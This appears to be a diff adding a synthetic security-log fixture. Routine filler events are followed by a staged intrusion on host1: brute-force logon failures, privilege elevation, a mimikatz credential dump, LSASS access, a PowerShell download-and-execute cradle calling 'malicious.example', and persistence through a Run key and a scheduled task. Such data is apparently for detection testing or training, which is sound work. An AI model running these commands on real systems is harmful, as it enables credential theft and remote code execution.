@@ -1,0 +1,64 @@
+{"@timestamp": "2026-06-14T21:15:58.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host1"}}
+{"@timestamp": "2026-06-14T20:58:13.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:41:23.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:39:04.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T20:56:27.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host1"}}
+{"@timestamp": "2026-06-14T20:52:55.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T21:15:43.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host4"}}
+{"@timestamp": "2026-06-14T20:57:07.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T21:07:26.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T21:03:24.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host1"}}
+{"@timestamp": "2026-06-14T21:18:59.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:50:04.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T20:38:27.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host5"}}
+{"@timestamp": "2026-06-14T20:54:02.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host4"}}
+{"@timestamp": "2026-06-14T20:29:30.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host4"}}
+{"@timestamp": "2026-06-14T20:38:52.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host4"}}
+{"@timestamp": "2026-06-14T21:19:21.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host1"}}
+{"@timestamp": "2026-06-14T21:22:51.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host1"}}
+{"@timestamp": "2026-06-14T21:01:42.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:38:43.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T21:02:48.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host5"}}
+{"@timestamp": "2026-06-14T20:41:14.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T21:23:47.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T20:29:33.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T21:17:26.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:53:25.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:43:13.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T21:01:57.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host5"}}
+{"@timestamp": "2026-06-14T20:30:21.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host1"}}
+{"@timestamp": "2026-06-14T20:40:28.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host1"}}
+{"@timestamp": "2026-06-14T21:07:41.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T21:10:18.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host4"}}
+{"@timestamp": "2026-06-14T20:53:13.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T20:45:36.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T21:04:30.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T20:31:19.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host4"}}
+{"@timestamp": "2026-06-14T21:03:39.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host5"}}
+{"@timestamp": "2026-06-14T21:06:12.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:37:38.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T20:37:54.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host5"}}
+{"@timestamp": "2026-06-14T21:20:48.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host4"}}
+{"@timestamp": "2026-06-14T20:38:56.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host4"}}
+{"@timestamp": "2026-06-14T20:30:45.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:51:33.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:36:22.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host1"}}
+{"@timestamp": "2026-06-14T20:40:32.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:35:51.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host3"}}
+{"@timestamp": "2026-06-14T20:27:53.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:56:23.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host5"}}
+{"@timestamp": "2026-06-14T21:15:43.275730", "log.source_type": "system", "message": "Routine system event", "host": {"name": "host2"}}
+{"@timestamp": "2026-06-14T20:55:24.275730", "log.source_type": "windows_security", "event_id": 4625, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc"}, "source": {"ip": "10.0.0.5"}, "message": "Windows Event 4625 on host1", "event_uuid": "8b0889c0-aaa5-49a4-91ee-de4835ed1e88", "event.action": "logon_failure", "failure_reason": "Unknown"}
+{"@timestamp": "2026-06-14T20:55:29.275730", "log.source_type": "windows_security", "event_id": 4625, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc"}, "source": {"ip": "10.0.0.5"}, "message": "Windows Event 4625 on host1", "event_uuid": "2c9c5279-bcce-46f0-9479-f9126da9d234", "event.action": "logon_failure", "failure_reason": "Unknown"}
+{"@timestamp": "2026-06-14T20:55:34.275730", "log.source_type": "windows_security", "event_id": 4625, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc"}, "source": {"ip": "10.0.0.5"}, "message": "Windows Event 4625 on host1", "event_uuid": "d1575506-8633-4c0e-b01e-a78b8dd29e9a", "event.action": "logon_failure", "failure_reason": "Unknown"}
+{"@timestamp": "2026-06-14T20:55:39.275730", "log.source_type": "windows_security", "event_id": 4625, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc"}, "source": {"ip": "10.0.0.5"}, "message": "Windows Event 4625 on host1", "event_uuid": "5752cebc-058c-4124-9ebf-a3ddd6fd30b2", "event.action": "logon_failure", "failure_reason": "Unknown"}
+{"@timestamp": "2026-06-14T20:55:44.275730", "log.source_type": "windows_security", "event_id": 4625, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc"}, "source": {"ip": "10.0.0.5"}, "message": "Windows Event 4625 on host1", "event_uuid": "e85b6a0b-6335-4109-a7de-a8b61055b828", "event.action": "logon_failure", "failure_reason": "Unknown"}
+{"@timestamp": "2026-06-14T20:55:49.275730", "log.source_type": "windows_security", "event_id": 4625, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc"}, "source": {"ip": "10.0.0.5"}, "message": "Windows Event 4625 on host1", "event_uuid": "642b6555-ab53-4e0e-ad75-3261898686ec", "event.action": "logon_failure", "failure_reason": "Unknown"}
+{"@timestamp": "2026-06-14T20:55:54.275730", "log.source_type": "windows_security", "event_id": 4624, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc"}, "source": {"ip": "10.0.0.5"}, "message": "Windows Event 4624 on host1", "event_uuid": "e9861916-ee8c-43cc-8fe0-538a02c65f6d", "event.action": "logon_success"}
+{"@timestamp": "2026-06-14T20:56:24.275730", "log.source_type": "windows_security", "event_id": 4672, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc01"}, "source": {"ip": "10.0.0.5"}, "message": "Windows Event 4672 on host1", "event_uuid": "ec64e444-7b10-43a6-9608-c667966f93fe", "event.action": "privilege_elevation"}
+{"@timestamp": "2026-06-14T20:56:26.275730", "log.source_type": "sysmon", "event_id": 1, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc01"}, "message": "Sysmon Event 1 on host1", "event_uuid": "545b64ed-1696-4b08-9ffc-215e84f2b630", "event.action": "process_create", "process": {"name": "mimikatz.exe", "command_line": "mimikatz.exe sekurlsa::logonpasswords", "pid": 4321, "parent_pid": null}}
+{"@timestamp": "2026-06-14T20:56:27.275730", "log.source_type": "sysmon", "event_id": 10, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc01"}, "message": "Sysmon Event 10 on host1", "event_uuid": "8482e65c-d180-4f61-9255-119668704ad6", "event.action": "lsass_access", "process": {"name": "lsass.exe"}, "target": {"process": "lsass.exe"}}
+{"@timestamp": "2026-06-14T20:57:24.275730", "log.source_type": "powershell", "event_id": 4104, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc01"}, "message": "PowerShell script block", "script_block_text": "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vbWFsaWNpb3VzLmV4YW1wbGUvcGF5bG9hZC5wczEnKQ==", "script_block_decoded": "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/payload.ps1')", "event_uuid": "588f4f7c-a0c4-4e3c-aac8-597fbfb8b490"}
+{"@timestamp": "2026-06-14T20:57:25.275730", "log.source_type": "sysmon", "event_id": 1, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc01"}, "message": "Sysmon Event 1 on host1", "event_uuid": "d4b5c61b-a136-4ff0-ba55-036c45671575", "event.action": "process_create", "process": {"name": "powershell.exe", "command_line": "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/payload.ps1')", "pid": 5555, "parent_pid": null}}
+{"@timestamp": "2026-06-14T20:58:24.275730", "log.source_type": "sysmon", "event_id": 13, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc01"}, "message": "Sysmon Event 13 on host1", "event_uuid": "cfa2be30-d740-418b-afe7-c6dc2bae4d11", "event.action": "registry_change", "registry": {"path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\\Updater", "operation": "set"}}
+{"@timestamp": "2026-06-14T20:58:25.275730", "log.source_type": "windows_security", "event_id": 4698, "host": {"name": "host1", "os": "windows"}, "user": {"name": "svc01"}, "source": {"ip": "10.0.0.5"}, "message": "Windows Event 4698 on host1", "event_uuid": "127805cb-53e5-4090-9bc0-a3bf18693bca", "event.action": "create_scheduled_task", "task_name": "UpdaterJob"}
